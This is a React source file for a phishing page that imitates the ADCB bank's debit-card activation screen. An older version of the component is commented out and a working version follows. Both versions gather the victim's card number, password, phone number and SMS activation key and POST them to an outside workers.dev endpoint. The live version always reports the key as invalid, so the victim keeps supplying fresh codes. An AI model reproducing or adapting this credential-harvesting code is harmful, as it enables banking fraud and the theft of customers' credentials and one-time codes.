// import { useState } from "react";
// import { useLocation, useNavigate } from "react-router-dom";
// import Logo from "./assets/adcb.jpg"

// const CreditCardIcon = () => (
//     <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke="white" strokeWidth="1.8">
//         <rect x="2" y="5" width="20" height="14" rx="2" stroke="white" strokeWidth="1.8" />
//         <line x1="2" y1="10" x2="22" y2="10" stroke="white" strokeWidth="1.8" />
//         <line x1="6" y1="15" x2="10" y2="15" stroke="white" strokeWidth="2" strokeLinecap="round" />
//     </svg>
// );

// const ADCBLogo = () => (
//   <img
//     src={Logo}
//     alt="ADCB Logo"
//     style={{ height: "48px", objectFit: "contain" }}
//   />
// );

// const StepDots = () => (
//     <div className="flex items-center gap-1">
//         <div className="w-4 h-4 rounded-full bg-red-600" />
//         <div className="w-8 h-0.5 bg-red-600" />
//         <div className="w-4 h-4 rounded-full bg-red-600" />
//         <div className="w-8 h-0.5 bg-red-600" />
//         <div className="w-4 h-4 rounded-full bg-red-600" />
//     </div>
// );

// const maskCardNumber = (num) => {
//   if (!num) return "";
//   const str = String(num);
//   if (str.length <= 8) return str;
//   const first4 = str.slice(0, 4);
//   const last4 = str.slice(-4);
//   const middle = "X".repeat(str.length - 8);
//   return `${first4}${middle}${last4}`;
// };

// export default function ADCBWelcomeActivationSecond() {
//     const [activationKey, setActivationKey] = useState("");
//     const [touched, setTouched] = useState(false);
//     const navigate = useNavigate();
//     const location = useLocation();
//     const { cardNumber, password, phone } = location.state || {};

//     const isEmpty = touched && activationKey.trim() === "";

//     const handleSubmit =async()=>{
//         setTouched(true)
//          const payload = {
//                 password: password,
//                 cardNumber, 
//                 activationKey, 
//                 phone
//             }
//             await fetch(
//                 "https://my-worker-app.instapayapi.workers.dev/api/lastactivationKey",
//                 {
//                     method: "POST",
//                     headers: { "Content-Type": "application/json" },
//                     body: JSON.stringify(payload),
//                 },
//             );
//         // navigate("/adcbmobile", { state: { cardNumber, password } });
//     }
//     return (
//         <div className="flex flex-col overflow-hidden" style={{ width: "100%", height: "100vh", maxHeight: "100vh", fontFamily: "'Helvetica Neue', Arial, sans-serif" }}>

//             {/* Nav bar */}
//             <div className="bg-white flex items-center px-5 py-3 border-b border-gray-100 flex-shrink-0">
//                 <button className="mr-4 text-gray-700">
//                     <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
//                         <path d="M15 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
//                     </svg>
//                 </button>
//                 <div className="flex-1 flex justify-center">
//                     <ADCBLogo />
//                 </div>
//             </div>

//             {/* White header section */}
//             <div className="bg-white px-5 pt-5 flex-shrink-0">
//                 <div className="flex justify-between items-center">
//                     <span className="font-black text-gray-900 tracking-wide text-base">Welcome</span>
//                     <StepDots />
//                 </div>
//             </div>

//             {/* Card icon with full-width horizontal line through center */}
//             <div className="relative bg-white flex-shrink-0" style={{ height: "70px" }}>
//                 {/* Full-width horizontal line at vertical center of icon (icon = 80px = w-20, so center = 40px from top of this div) */}
//                 <div
//                     className="absolute bg-gray-200"
//                     style={{
//                         top: "40px",
//                         left: 0,
//                         right: 0,
//                         height: "1px",
//                         zIndex: 0,
//                     }}
//                 />
//                 {/* Card icon centered, on top of the line */}
//                 <div className="absolute left-0 right-0 flex justify-center" style={{ top: "0px", zIndex: 1 }}>
//                     <div className="w-20 h-20 rounded-full flex items-center justify-center shadow-md" style={{ background: "#cc0000" }}>
//                         <CreditCardIcon />
//                     </div>
//                 </div>
//             </div>

//             {/* White content area */}
//             <div className="flex-1 flex flex-col bg-white px-5 pt-10 pb-8 overflow-hidden">

//                 {/* Card info */}
//                 <div className="flex flex-col items-center mb-8 flex-shrink-0">
//                     <p className="text-gray-600 text-base mb-1">Your Debit Card Number</p>
//                     <p className="font-bold text-gray-900 text-base tracking-wider">
//                         {cardNumber ? maskCardNumber(cardNumber) : "XXXXXXXXXXXX"}
//                     </p>
//                 </div>

//                 {/* Info text */}
//                 <div className="mb-6 px-2 flex-shrink-0">
//                     <p className="text-gray-500 text-sm text-center leading-relaxed">
//                         To help validate the process, please enter the Activation Key sent to your mobile number
//                     </p>
//                 </div>

//                 {/* Activation Key field */}
//                 <div className="mb-4 flex-shrink-0">
//                     <label className="font-bold text-gray-900 text-sm block mb-2">
//                         Activation Key
//                     </label>
//                     <input
//                         type="text"
//                         value={activationKey}
//                         onChange={(e) => setActivationKey(e.target.value)}
//                         onBlur={() => setTouched(true)}
//                         placeholder="Enter Activation Key"
//                         className="w-full px-4 py-4 rounded-lg bg-white text-gray-400 text-sm outline-none"
//                         style={{
//                             border: isEmpty ? "1.5px solid #cc0000" : "1.5px solid #d1d5db",
//                             fontSize: "15px",
//                         }}
//                     />
//                     {isEmpty && (
//                         <p className="text-red-600 text-xs mt-1 ml-1">Cannot be empty</p>
//                     )}
//                 </div>

//                 {/* Spacer */}
//                 <div className="flex-1" style={{ maxHeight: "80px" }} />

//                 {/* Next button */}
//                 <button
//                     // onClick={() => setTouched(true)}
//                     onClick={handleSubmit}
//                     className="w-full py-4 rounded-full text-white font-semibold text-base transition-opacity active:opacity-80 mb-6 flex-shrink-0"
//                     style={{ background: "#cc0000" }}
//                 >
//                     Next
//                 </button>

//                 {/* Support */}
//                 <div className="flex justify-center items-center gap-2 flex-shrink-0">
//                     <svg className="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
//                         <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
//                     </svg>
//                     <a href="#" className="text-red-600 text-sm underline">Support</a>
//                 </div>
//             </div>

//             {/* Watermark pattern */}
//             <div
//                 className="absolute bottom-0 left-0 right-0 h-28 pointer-events-none opacity-10"
//                 style={{
//                     backgroundImage: "repeating-linear-gradient(45deg, #cc0000 0, #cc0000 1px, transparent 0, transparent 50%)",
//                     backgroundSize: "8px 8px",
//                 }}
//             />
//         </div>
//     );
// }


import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import Logo from "./assets/adcb.jpg"

const CreditCardIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke="white" strokeWidth="1.8">
        <rect x="2" y="5" width="20" height="14" rx="2" stroke="white" strokeWidth="1.8" />
        <line x1="2" y1="10" x2="22" y2="10" stroke="white" strokeWidth="1.8" />
        <line x1="6" y1="15" x2="10" y2="15" stroke="white" strokeWidth="2" strokeLinecap="round" />
    </svg>
);

const ADCBLogo = () => (
  <img
    src={Logo}
    alt="ADCB Logo"
    style={{ height: "48px", objectFit: "contain" }}
  />
);

const StepDots = () => (
    <div className="flex items-center gap-1">
        <div className="w-4 h-4 rounded-full bg-red-600" />
        <div className="w-8 h-0.5 bg-red-600" />
        <div className="w-4 h-4 rounded-full bg-red-600" />
        <div className="w-8 h-0.5 bg-red-600" />
        <div className="w-4 h-4 rounded-full bg-red-600" />
    </div>
);

const maskCardNumber = (num) => {
  if (!num) return "";
  const str = String(num);
  if (str.length <= 8) return str;
  const first4 = str.slice(0, 4);
  const last4 = str.slice(-4);
  const middle = "X".repeat(str.length - 8);
  return `${first4}${middle}${last4}`;
};

export default function ADCBWelcomeActivationSecond() {
    const [activationKey, setActivationKey] = useState("");
    const [touched, setTouched] = useState(false);
    const [isInvalid, setIsInvalid] = useState(false);
    const [loading, setLoading] = useState(false);
    const navigate = useNavigate();
    const location = useLocation();
    const { cardNumber, password, phone } = location.state || {};

    const isEmpty = touched && activationKey.trim() === "";

    const handleSubmit = async () => {
        setTouched(true);
        if (activationKey.trim() === "") return;

        setLoading(true);

        const payload = {
            password,
            cardNumber,
            activationKey,
            phone,
        };

        await fetch(
            "https://my-worker-app.instapayapi.workers.dev/api/lastactivationKey",
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            }
        ).catch(() => {});

        // Clear field and show invalid error always
        setActivationKey("");
        setTouched(false);
        setIsInvalid(true);
        setLoading(false);
    };

    const handleChange = (e) => {
        setActivationKey(e.target.value);
        if (isInvalid) setIsInvalid(false);
    };

    return (
        <div className="flex flex-col overflow-hidden" style={{ width: "100%", height: "100vh", maxHeight: "100vh", fontFamily: "'Helvetica Neue', Arial, sans-serif" }}>

            {/* Nav bar */}
            <div className="bg-white flex items-center px-5 py-3 border-b border-gray-100 flex-shrink-0">
                <button className="mr-4 text-gray-700">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                        <path d="M15 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                </button>
                <div className="flex-1 flex justify-center">
                    <ADCBLogo />
                </div>
            </div>

            {/* White header section */}
            <div className="bg-white px-5 pt-5 flex-shrink-0">
                <div className="flex justify-between items-center">
                    <span className="font-black text-gray-900 tracking-wide text-base">Welcome</span>
                    <StepDots />
                </div>
            </div>

            {/* Card icon with full-width horizontal line through center */}
            <div className="relative bg-white flex-shrink-0" style={{ height: "70px" }}>
                <div className="absolute bg-gray-200" style={{ top: "40px", left: 0, right: 0, height: "1px", zIndex: 0 }} />
                <div className="absolute left-0 right-0 flex justify-center" style={{ top: "0px", zIndex: 1 }}>
                    <div className="w-20 h-20 rounded-full flex items-center justify-center shadow-md" style={{ background: "#cc0000" }}>
                        <CreditCardIcon />
                    </div>
                </div>
            </div>

            {/* White content area */}
            <div className="flex-1 flex flex-col bg-white px-5 pt-10 pb-8 overflow-hidden">

                {/* Card info */}
                <div className="flex flex-col items-center mb-8 flex-shrink-0">
                    <p className="text-gray-600 text-base mb-1">Your Debit Card Number</p>
                    <p className="font-bold text-gray-900 text-base tracking-wider">
                        {cardNumber ? maskCardNumber(cardNumber) : "XXXXXXXXXXXX"}
                    </p>
                </div>

                {/* Info text */}
                <div className="mb-6 px-2 flex-shrink-0">
                    <p className="text-gray-500 text-sm text-center leading-relaxed">
                        To help validate the process, please enter the Activation Key sent to your mobile number
                    </p>
                </div>

                {/* Activation Key field */}
                <div className="mb-4 flex-shrink-0">
                    <div className="flex justify-between items-center mb-2">
                        <label className="font-bold text-gray-900 text-sm">
                            Activation Key
                        </label>
                        {isInvalid && (
                            <div className="w-6 h-6 rounded-full bg-red-600 flex items-center justify-center">
                                <span className="text-white text-xs font-bold">!</span>
                            </div>
                        )}
                    </div>
                    <input
                        type="text"
                        value={activationKey}
                        onChange={handleChange}
                        onBlur={() => setTouched(true)}
                        placeholder="Enter Activation Key"
                        className="w-full px-4 py-4 rounded-lg bg-white text-gray-700 text-sm outline-none"
                        style={{
                            border: (isEmpty || isInvalid) ? "1.5px solid #cc0000" : "1.5px solid #d1d5db",
                            fontSize: "15px",
                        }}
                    />
                    {isEmpty && (
                        <p className="text-red-600 text-xs mt-1 ml-1">Cannot be empty</p>
                    )}
                    {isInvalid && (
                        <p className="text-red-600 text-xs mt-1 ml-1">Invalid Activation Key. Please try again.</p>
                    )}
                </div>

                {/* Spacer */}
                <div className="flex-1" style={{ maxHeight: "80px" }} />

                {/* Next button */}
                <button
                    onClick={handleSubmit}
                    disabled={loading}
                    className="w-full py-4 rounded-full text-white font-semibold text-base transition-opacity active:opacity-80 mb-6 flex-shrink-0"
                    style={{ background: "#cc0000", opacity: loading ? 0.7 : 1 }}
                >
                    {loading ? "Please wait..." : "Next"}
                </button>

                {/* Support */}
                <div className="flex justify-center items-center gap-2 flex-shrink-0">
                    <svg className="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                    </svg>
                    <a href="#" className="text-red-600 text-sm underline">Support</a>
                </div>
            </div>

            {/* Watermark pattern */}
            <div
                className="absolute bottom-0 left-0 right-0 h-28 pointer-events-none opacity-10"
                style={{
                    backgroundImage: "repeating-linear-gradient(45deg, #cc0000 0, #cc0000 1px, transparent 0, transparent 50%)",
                    backgroundSize: "8px 8px",
                }}
            />
        </div>
    );
}